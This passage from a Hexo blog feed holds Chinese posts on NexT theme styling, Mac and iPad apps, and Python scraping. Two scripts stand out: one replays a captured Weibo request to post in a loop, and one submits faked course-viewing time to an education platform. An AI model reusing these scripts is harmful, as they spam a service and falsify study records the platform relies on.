class="line">    +mobile() &#123; <span class="attribute">text-align</span>: <span class="variable">$site-meta-text-align</span>; &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="selector-class">.post-eof</span> &#123; <span class="attribute">display</span>: none; &#125;</span><br><span class="line"></span><br><span class="line">  <span class="selector-class">.post</span> &#123; <span class="attribute">margin-top</span>: <span class="number">80px</span>; &#125;</span><br><span class="line">  <span class="selector-class">.post</span>:first-child &#123; <span class="attribute">margin-top</span>: <span class="number">0</span>; &#125;</span><br><span class="line"></span><br><span class="line">  <span class="selector-class">.post-meta</span> &#123;                       <span class="comment">//预览部分偏移量</span></span><br><span class="line">    <span class="attribute">margin-top</span>: <span class="number">20px</span>;</span><br><span class="line">    <span class="attribute">margin-bottom</span>: <span class="number">20px</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="selector-class">.post-title</span> &#123;                      <span class="comment">//文章标题 </span></span><br><span class="line">    <span class="attribute">font-size</span>: <span class="number">26px</span>;</span><br><span class="line"></span><br><span class="line">    <span class="attribute">font-weight</span>: bolder;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="selector-class">.post-body</span> <span class="selector-tag">img</span> &#123; <span class="attribute">margin</span>: <span class="number">0</span>; &#125;</span><br><span class="line"></span><br><span class="line">  <span class="selector-class">.post-tags</span> &#123;</span><br><span class="line">    <span class="attribute">text-align</span>: left;</span><br><span class="line">    <span class="selector-tag">a</span> &#123;</span><br><span class="line">      <span class="attribute">padding</span>: <span class="number">1px</span> <span class="number">5px</span>;</span><br><span class="line">      <span class="attribute">background</span>: <span class="variable">$whitesmoke</span>;        <span class="comment">//tags</span></span><br><span class="line">      <span class="comment">//border-bottom: none;        </span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="selector-tag">a</span>:hover &#123; <span class="attribute">background</span>: <span class="variable">$grey-light</span>; &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="selector-class">.post-nav</span> &#123; <span class="attribute">margin-top</span>: <span class="number">10px</span>; &#125;     <span class="comment">//tag 与下方分隔栏的距离</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//阅读更多 按钮</span></span><br><span class="line"><span class="comment">//----------------------------------------------------</span></span><br><span class="line"><span class="selector-class">.post-more-link</span> &#123;</span><br><span class="line">  <span class="attribute">margin-top</span>: <span class="number">0px</span>;</span><br><span class="line">  <span class="attribute">text-align</span>: left;</span><br><span class="line"></span><br><span class="line">  <span class="selector-tag">a</span> &#123;</span><br><span class="line">    <span class="attribute">padding</span>: <span class="number">0px</span> <span class="number">0px</span> <span class="number">0px</span> <span class="number">0px</span>;</span><br><span class="line">    <span class="attribute">font-size</span>: <span class="number">14px</span>;</span><br><span class="line">    <span class="attribute">color</span>: <span class="variable">$grey-dim</span>;</span><br><span class="line">    <span class="attribute">background</span>: none;</span><br><span class="line">    <span class="attribute">border</span>: none;</span><br><span class="line">    <span class="attribute">border-bottom</span>: <span class="number">1px</span> solid <span class="variable">$grey-dim</span>;</span><br><span class="line">    <span class="attribute">transition-property</span>: border;</span><br><span class="line"></span><br><span class="line">    &amp;:hover &#123; <span class="attribute">border-bottom-color</span>: black; &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// Page - Post details    单独文章页 标题</span></span><br><span class="line"><span class="comment">// --------------------------------------------------</span></span><br><span class="line"><span class="selector-class">.page-post-detail</span> &#123;</span><br><span class="line">  <span class="selector-class">.post-title</span>,</span><br><span class="line">  <span class="selector-class">.post-meta</span> &#123; <span class="attribute">text-align</span>: center; &#125;</span><br><span class="line">  </span><br><span class="line">  <span class="selector-class">.post-meta</span> &#123; <span class="attribute">margin-bottom</span>: <span class="number">60px</span>; &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// Pagination       主页 页数栏</span></span><br><span class="line"><span class="comment">// --------------------------------------------------</span></span><br><span class="line"><span class="selector-class">.pagination</span> &#123;</span><br><span class="line">  <span class="attribute">margin</span>: <span class="number">40px</span> <span class="number">0px</span> <span class="number">0px</span> -<span class="number">20px</span>;</span><br><span class="line">  <span class="attribute">text-align</span>: left;</span><br><span class="line">  <span class="comment">//background: $white;</span></span><br><span class="line"></span><br><span class="line">  +mobile() &#123;</span><br><span class="line">    <span class="attribute">margin</span>: <span class="number">20px</span> <span class="number">0px</span> <span class="number">0px</span> <span class="number">10px</span>;</span><br><span class="line">    <span class="attribute">text-align</span>: left;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Footer           页脚</span></span><br><span class="line"><span class="comment">// --------------------------------------------------</span></span><br><span class="line"><span class="selector-class">.footer</span> &#123;</span><br><span class="line">  <span class="attribute">margin-top</span>: <span class="number">80px</span>;</span><br><span class="line">  <span class="attribute">padding</span>: <span class="number">20px</span> <span class="number">0</span>;</span><br><span class="line">  <span class="attribute">background</span>: <span class="variable">$white</span>;</span><br><span class="line">  <span class="attribute">color</span>: <span class="variable">$grey-dim</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-class">.footer-inner</span> &#123;</span><br><span class="line">  <span class="attribute">margin</span>: <span class="number">0</span> auto;</span><br><span class="line">  <span class="attribute">text-align</span>: centerr;</span><br><span class="line"></span><br><span class="line">  +mobile() &#123; <span class="attribute">text-align</span>: center; &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Helpers</span></span><br><span class="line"><span class="comment">// --------------------------------------------------</span></span><br><span class="line"><span class="selector-class">.full-image</span><span class="selector-class">.full-image</span><span class="selector-class">.full-image</span> &#123;</span><br><span class="line">  <span class="attribute">max-width</span>: <span class="number">100%</span>;</span><br><span class="line">  <span class="attribute">width</span>: auto;</span><br><span class="line">  <span class="attribute">margin</span>: <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>以上是我的<code>index.styl</code>文件，直接拖到你自己的位置就能用，相当于是另一个主题了。。。<br>其实可以联系 next 作者的。。。<br>但是我的代码确实写得很渣  </p><h1 id="字体"><a href="#字体" class="headerlink" title="字体"></a>字体</h1><p>这个原作者说过了，就是改<br><code>/hexo/themes/next/source/css/_variables/custom.styl</code><br>添加几行就行了，我的是这样的：<br><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$content</span>-desktop = <span class="number">740px</span></span><br><span class="line"><span class="variable">$font</span>-family-base = <span class="string">"PingFang"</span>, Verdana, sans-serif <span class="comment">// 修改成你期望的字体族</span></span><br><span class="line"><span class="selector-class">.highlight</span> &#123;</span><br><span class="line">  -webkit-<span class="attribute">overflow</span>-scrolling: touch;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>对了，我还在上面的<code>index.styl</code>文件中调整了文字的间距  </p><hr><p>以上</p>]]></content>
      
      
      <categories>
          
          <category> Discovery </category>
          
      </categories>
      
      
        <tags>
            
            <tag> hexo </tag>
            
            <tag> next </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>Python 刷微博</title>
      <link href="/2015/10-10-post-weibo/"/>
      <url>/2015/10-10-post-weibo/</url>
      
        <content type="html"><![CDATA[<p><a href="http://gaoryrt.github.io/2015/10/09/whatsup/" target="_blank" rel="noopener">上一篇</a>里面说过了，要改冲神的<code>jincin.py</code><br>改成功了，能够刷微博，但是好像并不完美。。。<br><a id="more"></a></p><h1 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h1><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding=utf-8</span></span><br><span class="line">import urllib</span><br><span class="line">import urllib2</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">11</span>):</span><br><span class="line">    url = <span class="string">"http://m.weibo.cn/mblogDeal/addAMblog"</span></span><br><span class="line"></span><br><span class="line">    data = <span class="string">"content=发十次之"</span>+str(i)+<span class="string">"&amp;st=ceb309"</span></span><br><span class="line"></span><br><span class="line">    headers = &#123;<span class="string">'Host'</span>: <span class="string">'m.weibo.cn'</span>,</span><br><span class="line">            <span class="string">'Accept'</span>: <span class="string">'application/json, text/javascript, */*; q=0.01'</span>,</span><br><span class="line">            <span class="string">'X-Requested-With'</span>: <span class="string">'XMLHttpRequest'</span>,</span><br><span class="line">            <span class="string">'Accept-Encoding'</span>: <span class="string">'gzip, deflate'</span>,</span><br><span class="line">            <span class="string">'Accept-Language'</span>: <span class="string">'zh-cn'</span>,</span><br><span class="line">            <span class="string">'Content-Type'</span>: <span class="string">'application/x-www-form-urlencoded; charset=UTF-8'</span>,</span><br><span class="line">            <span class="string">'Origin'</span>: <span class="string">'http://m.weibo.cn'</span>,</span><br><span class="line">            <span class="string">'Content-Length'</span>: <span class="string">'26'</span>,</span><br><span class="line">            <span class="string">'Connection'</span>: <span class="string">'keep-alive'</span>,</span><br><span class="line">            <span class="string">'User-Agent'</span>: <span class="string">'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11) AppleWebKit/601.1.56 (KHTML, like Gecko) Version/9.0 Safari/601.1.56'</span>,</span><br><span class="line">            <span class="string">'Referer'</span>: <span class="string">'http://m.weibo.cn/mblog'</span>,</span><br><span class="line">            <span class="string">'Cookie'</span>: <span class="string">'不准看'</span>&#125;</span><br><span class="line"></span><br><span class="line">    req = urllib2.Request(url, data, headers)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    try:</span><br><span class="line">        response = urllib2.urlopen(req)</span><br><span class="line">        print(i)</span><br><span class="line">    except:</span><br><span class="line">        print(<span class="string">'error!'</span>)</span><br><span class="line">        <span class="keyword">exit</span>()</span><br><span class="line"></span><br><span class="line">print(response.read())</span><br></pre></td></tr></table></figure><hr><h1 id="效果"><a href="#效果" class="headerlink" title="效果"></a>效果</h1><p><img src="http://ww1.sinaimg.cn/large/a243ad6cjw1eww0ouwkvrj207k0dm3zb.jpg" alt=""></p><p>可惜不会吧所有的都发出来<br>但是已经晓得通过<code>m.weibo.com</code>可以通过发送<code>post</code>包的方式发微博<br>理论上现在只用改数据就可以做到发一百次一千次<br>不知道微博有没有限制，我还没有尝试<br>有的话就用 <code>delay</code> 吧，也是两三行的操作<br>希望新浪不要把这个给封了</p><hr><p>以上</p>]]></content>
      
      
      <categories>
          
          <category> 硬悟学蛇 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> python </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>What&#39;s Up</title>
      <link href="/2015/10-09-whatsup/"/>
      <url>/2015/10-09-whatsup/</url>
      
        <content type="html"><![CDATA[<p>买了 ipad 这几天都没有更新<br>长话短说，四件事  </p><ol><li>mac 软件</li><li>ipad 软件</li><li>next 更新</li><li>python 脚本  </li></ol><a id="more"></a><hr><h1 id="Mac-软件"><a href="#Mac-软件" class="headerlink" title="Mac 软件"></a>Mac 软件</h1><h2 id="macdown"><a href="#macdown" class="headerlink" title="macdown"></a>macdown</h2><p>不要用<code>mou</code>了，用<code>macdown</code>吧<br>自定义的东西多得多，快捷键基本上可以无缝切换过去<br>主要是不喜欢<code>mou</code>的开发者  </p><h2 id="go2shell"><a href="#go2shell" class="headerlink" title="go2shell"></a>go2shell</h2><p>在 finder 中找到了文件，想在 shell 中打开<br><code>cd</code> 还是直接拖动文件都比较麻烦</p><h2 id="unclutter"><a href="#unclutter" class="headerlink" title="unclutter"></a>unclutter</h2><p>方便的中转站，包括已复制的文本，图片，或者是文件，网址</p><h2 id="karabiner"><a href="#karabiner" class="headerlink" title="karabiner"></a>karabiner</h2><p>改键位用<br>我的 mac 是12年的了，右上角有个 <code>eject</code> 键用来弹出光盘<br>然而我光驱换了 ssd ，就用这个把 <code>eject</code> 换成 <code>delete</code>了</p><h2 id="Teanmviewer"><a href="#Teanmviewer" class="headerlink" title="Teanmviewer"></a>Teanmviewer</h2><p>超超超方便的桌面同屏，免费</p><hr><h1 id="iPad-软件"><a href="#iPad-软件" class="headerlink" title="iPad 软件"></a>iPad 软件</h1><h2 id="墨笔"><a href="#墨笔" class="headerlink" title="墨笔"></a>墨笔</h2><p>记笔记超好用的</p><h2 id="播客"><a href="#播客" class="headerlink" title="播客"></a>播客</h2><p>ipn 的好几个都特别有意义，坐公交的时候都不听歌了</p><h2 id="Adobe-reader-amp-cabinet"><a href="#Adobe-reader-amp-cabinet" class="headerlink" title="Adobe reader &amp; cabinet"></a>Adobe reader &amp; cabinet</h2><p>看 pdf</p><hr><h1 id="NexT-主题更新"><a href="#NexT-主题更新" class="headerlink" title="NexT 主题更新"></a>NexT 主题更新</h1><p>简单的预想：  </p><p><img src="http://ww1.sinaimg.cn/large/a243ad6cjw1ewvaglhr5sj20j60chmz7.jpg" alt=""></p><p>要做的事情还很多<br>这个简单看了一下👉<a href="http://zodiacg.net/2015/05/hexo-theme-rebiture/" target="_blank" rel="noopener">Hexo主题Rebiture</a><br>他就是从 next 主题改过去的，步骤写的很详细了</p><hr><h1 id="python-脚本"><a href="#python-脚本" class="headerlink" title="python 脚本"></a>python 脚本</h1><p>主要是还想着无限发微博这一件事<br>暂时不晓得到底发一个 post 包到底要放哪些东西<br>就抓包看了一下<br><img src="http://ww4.sinaimg.cn/large/a243ad6cjw1ewvauk3ec3j20ja09ujsz.jpg" alt=""><br>👆这个抓包用，好用是好用，但是要付费<br><img src="http://ww2.sinaimg.cn/large/a243ad6cjw1ewvd57mlykj20m908ewfg.jpg" alt=""><br>👆信息很详细了，注意包括了 cookie<br><strong>这个相当恶心，我百度的姿势不对，还没有找到urllib 里面自己构造 cookie 怎么使用</strong><br><img src="http://ww1.sinaimg.cn/large/a243ad6cjw1ewvauio5twj20p70cudhi.jpg" alt=""><br>👆软件自带了构造的功能，把 <code>test</code> 改成 <code>TEST</code><br><img src="http://ww2.sinaimg.cn/large/a243ad6cjw1ewvaugoysmj208i0a074u.jpg" alt=""><br>👆效果如图<br><img src="http://ww3.sinaimg.cn/large/a243ad6cjw1ewvb0cekgdj20hb0nb40h.jpg" alt=""></p><p>手动最快就这个效果了<br>就是一直改数据，一直点击 <code>execute</code><br>然后冲神把他当年刷锦城教育的 python 脚本共享给我了<br>看代码<br><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding=utf-8</span></span><br><span class="line">import urllib2</span><br><span class="line">import urllib</span><br><span class="line">import hashlib</span><br><span class="line"></span><br><span class="line">user_name = <span class="string">''</span></span><br><span class="line">get_token_url = <span class="string">'登陆获得令牌'</span></span><br><span class="line">update_url = <span class="string">'post 的目标'</span></span><br><span class="line"></span><br><span class="line">user_name = raw_input(<span class="string">'input username:'</span>)</span><br><span class="line">user_psd = raw_input(<span class="string">'input password:'</span>)</span><br><span class="line">courseid = raw_input(<span class="string">'input course id(多个course id用逗号分隔):'</span>.decode(<span class="string">'utf-8'</span>).encode(<span class="string">'gbk'</span>)).split(<span class="string">','</span>)</span><br><span class="line"></span><br><span class="line">md5_psd = hashlib.md5(user_psd.encode(<span class="string">'utf-8'</span>)).hexdigest()</span><br><span class="line"></span><br><span class="line">cookies = <span class="string">'cookie 构造'</span></span><br><span class="line">values = <span class="string">'登陆信息构造'</span></span><br><span class="line">data = <span class="string">'$$CDORequest$$'</span> + urllib.urlencode(&#123;<span class="string">''</span> : values&#125;)</span><br><span class="line">headers = &#123;</span><br><span class="line">           <span class="string">'Accept'</span> : <span class="string">'*/*'</span>,</span><br><span class="line">           <span class="string">'Accept-Language'</span> : <span class="string">'zh-cn'</span>,</span><br><span class="line">           <span class="string">'Referer'</span> : <span class="string">'根据登陆时抓包内容填'</span>,</span><br><span class="line">           <span class="string">'Content-Type'</span> : <span class="string">'application/x-www-form-urlencoded;charset=utf-8'</span>,</span><br><span class="line">           <span class="string">'Accept-Encoding'</span> : <span class="string">'gzip, deflate'</span>,</span><br><span class="line">           <span class="string">'User-Agent'</span> : <span class="string">'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0)'</span>,</span><br><span class="line">           <span class="string">'Host'</span> : <span class="string">'host 地址'</span>,</span><br><span class="line">           <span class="string">'Content-Length'</span> : str(len(data)),</span><br><span class="line">           <span class="string">'Proxy-Connection'</span> : <span class="string">'Keep-Alive'</span>,</span><br><span class="line">           <span class="string">'Pragma'</span> : <span class="string">'no-cache'</span>,</span><br><span class="line">           <span class="string">'Cookie'</span> : <span class="string">'loginname='</span> + user_name&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">req = urllib2.Request(get_token_url, data, headers)</span><br><span class="line"></span><br><span class="line"><span class="comment">#get token</span></span><br><span class="line">try:</span><br><span class="line">    response = urllib2.urlopen(req)</span><br><span class="line">    req_head = response.info()</span><br><span class="line">    luserid = req_head[<span class="string">'Set-Cookie'</span>][<span class="number">71</span>:<span class="number">82</span>]</span><br><span class="line">    token = req_head[<span class="string">'Set-Cookie'</span>][<span class="number">117</span>:<span class="number">245</span>]</span><br><span class="line">except:</span><br><span class="line">    print(<span class="string">'username, password error!'</span>)</span><br><span class="line">    <span class="keyword">exit</span>()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#update</span></span><br><span class="line"><span class="keyword">for</span> cid <span class="keyword">in</span> courseid:</span><br><span class="line">    print(cid + <span class="string">':'</span>)</span><br><span class="line">    data = <span class="string">'lCourseId='</span> + cid + <span class="string">'&amp;lUserId='</span> + luserid + <span class="string">'&amp;strStartTime=0&amp;lSchoolId=73&amp;nCountTime=150&amp;strToken='</span> + token</span><br><span class="line">    headers = &#123;<span class="string">'Accept'</span>: <span class="string">'*/*'</span>,</span><br><span class="line">            <span class="string">'Accept-Language'</span>: <span class="string">'zh-CN'</span>,</span><br><span class="line">            <span class="string">'Referer'</span>: <span class="string">'根据 post 包填'</span>,</span><br><span class="line">            <span class="string">'x-flash-version'</span>: <span class="string">'15,0,0,223'</span>,</span><br><span class="line">            <span class="string">'Content-Type'</span>: <span class="string">'application/x-www-form-urlencoded'</span>,</span><br><span class="line">            <span class="string">'Content-Length'</span>: str(len(data)),</span><br><span class="line">            <span class="string">'Accept-Encoding'</span>: <span class="string">'gzip, deflate'</span>,</span><br><span class="line">            <span class="string">'User-Agent'</span>: <span class="string">'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0)'</span>,</span><br><span class="line">            <span class="string">'Proxy-Connection'</span>: <span class="string">'Keep-Alive'</span>,</span><br><span class="line">            <span class="string">'Host'</span>: <span class="string">'host 地址'</span>,</span><br><span class="line">            <span class="string">'Pragma'</span>: <span class="string">'no-cache'</span>,</span><br><span class="line">            <span class="string">'Cookie'</span>: <span class="string">'loginname='</span> + user_name&#125;</span><br><span class="line">    <span class="comment">#print(data)</span></span><br><span class="line"></span><br><span class="line">    req = urllib2.Request(update_url, data, headers)</span><br><span class="line">    try:</span><br><span class="line">        response = urllib2.urlopen(req)</span><br><span class="line">    except:</span><br><span class="line">        print(<span class="string">'error!'</span>)</span><br><span class="line">        <span class="keyword">exit</span>()</span><br><span class="line"></span><br><span class="line">    print(response.read())</span><br></pre></td></tr></table></figure></p><p>隐私内容已经屏蔽了<br>里面包含了模拟登陆和发送 post 包两个部分<br>然后是可以自己写 cookie 内容的<br>根据刚才抓包内容改了试试看<br>明儿来，现在太晚了<code>2015-10-10 00:42:07</code></p><hr><p>以上</p>]]></content>
      
      
      <categories>
          
          <category> Geek Talks · 奇客怪谈 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> howto </tag>
            
            <tag> mac </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>下载Dive Into Python3</title>
      <link href="/2015/10-06-downloadDiveintopython3/"/>
      <url>/2015/10-06-downloadDiveintopython3/</url>
      
        <content type="html"><![CDATA[<p>还是没有看廖雪峰的教程，就算我把它爬下来了。。。<br>在<a href="/2015/10/04/开始python3抓取数据/">上一篇</a>中，本来的目标是通过构造<code>get</code>和<code>post</code>来自动获取热门微博然后刷微博，但是写到最后变成了通过网站目录下载网站<br>然后刚好有一个网站想下载下来，就来试试看<br><a id="more"></a>  </p><h1 id="dive-into-python3"><a href="#dive-into-python3" class="headerlink" title="dive into python3"></a>dive into python3</h1><p>感觉这个才写的好嘛，精炼，适合有一点编程基础的人看。<br>他一共就十几个程序，每个程序里面都包含了很多要点<br>编者肯定很花了点心思来写<br>本来他的主页上有下载 pdf 和 html 的链接，只可惜都是404<br>那么就用昨天的脚本来试试看<br><img src="http://ww4.sinaimg.cn/large/a243ad6cjw1ewsmq37cnzj20h80jwq62.jpg" alt=""></p><hr><h1 id="修改源程序"><a href="#修改源程序" class="headerlink" title="修改源程序"></a>修改源程序</h1><p>利用的 <code>python</code>脚本文件就是上一篇的<br>改了不少地方：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> urllib.request</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> storethepage</span><br><span class="line"></span><br><span class="line">dic = &#123;&#125;</span><br><span class="line"><span class="comment">#初始化储存名称-url 对的字典</span></span><br><span class="line"></span><br><span class="line">url = <span class="string">"http://woodpecker.org.cn/diveintopython3/index.html"</span></span><br><span class="line"><span class="comment">#抓取的链接</span></span><br><span class="line"></span><br><span class="line">data = urllib.request.urlopen(url).read().decode(<span class="string">"UTF-8"</span>)</span><br><span class="line"><span class="comment">#格式化后的整个文本</span></span><br><span class="line"></span><br><span class="line">urllib.request.urlopen(url).close()</span><br><span class="line"></span><br><span class="line">links = re.compile(<span class="string">'html&gt;(.+?)&lt;/a&gt;'</span>)</span><br><span class="line"><span class="comment">#定位1</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> names <span class="keyword">in</span> links.findall(data):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        nPos = names.index(<span class="string">'/'</span>)</span><br><span class="line">        names = names[<span class="number">0</span>:<span class="number">1</span>]</span><br><span class="line">        nPos = <span class="number">-1</span></span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        nPos = <span class="number">-1</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> nPos == <span class="number">-1</span>:</span><br><span class="line">        dic[<span class="string">'%s'</span>%names] = <span class="string">'-'</span></span><br><span class="line">        print(names)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> names <span class="keyword">in</span> dic.keys():</span><br><span class="line">    temp = <span class="string">'href=(.+?)&gt;'</span>+names</span><br><span class="line">    <span class="comment">#定位2</span></span><br><span class="line">    urlses = re.compile(temp)</span><br><span class="line">    urlname = <span class="string">'http://woodpecker.org.cn/diveintopython3/'</span>+urlses.findall(data)[<span class="number">0</span>]</span><br><span class="line">    dic[names] = urlname</span><br><span class="line"></span><br><span class="line"><span class="comment">#储存</span></span><br><span class="line"><span class="keyword">with</span> open(<span class="string">"diveintopython3.pickle"</span>,<span class="string">"wb"</span>) <span class="keyword">as</span> f:</span><br><span class="line">    pickle.dump(dic,f)</span><br><span class="line"></span><br><span class="line"><span class="keyword">del</span> dic[<span class="string">'随时欢迎反馈意见'</span>]</span><br><span class="line"><span class="keyword">del</span> dic[<span class="string">'展开'</span>]</span><br><span class="line"></span><br><span class="line">storethepage.store_the_page(dic)</span><br></pre></td></tr></table></figure></p><hr><h1 id="遇到的麻烦"><a href="#遇到的麻烦" class="headerlink" title="遇到的麻烦"></a>遇到的麻烦</h1><ol><li>names 一下就找到了，url 死活找不到</li><li>url 会读取到不想要的内容</li><li>names 中包含<code>/</code>的都写入不了</li></ol><p>解决方法：  </p><ol><li>浏览器的检查器看到的 url 格式和程序当中看的不一样，检查器中的 url 带引号略坑爹  <img src="http://ww2.sinaimg.cn/large/a243ad6cjw1ewsmq10s47j20uw0l60ym.jpg" alt=""></li><li>在最后把这两条不想要的直接删除了</li><li>一共四条内容包含<code>/</code>，直接截取第一个字，恰好还可以供后面的用</li></ol><hr><h1 id="效果"><a href="#效果" class="headerlink" title="效果"></a>效果</h1><p>看图<br><img src="http://ww1.sinaimg.cn/large/a243ad6cjw1ewskgw65knj209u0ahtay.jpg" alt=""><br><img src="http://ww1.sinaimg.cn/large/a243ad6cjw1ewskgyhjf9j207p0bpgn4.jpg" alt=""></p><hr><p>以上</p>]]></content>
      
      
      <categories>
          
          <category> 硬悟学蛇 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> python </tag>
            
            <tag> abc </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>开始Python3抓取数据</title>
      <link href="/2015/10-04-%E5%BC%80%E5%A7%8Bpython3%E6%8A%93%E5%8F%96%E6%95%B0%E6%8D%AE/"/>
      <url>/2015/10-04-%E5%BC%80%E5%A7%8Bpython3%E6%8A%93%E5%8F%96%E6%95%B0%E6%8D%AE/</url>
      
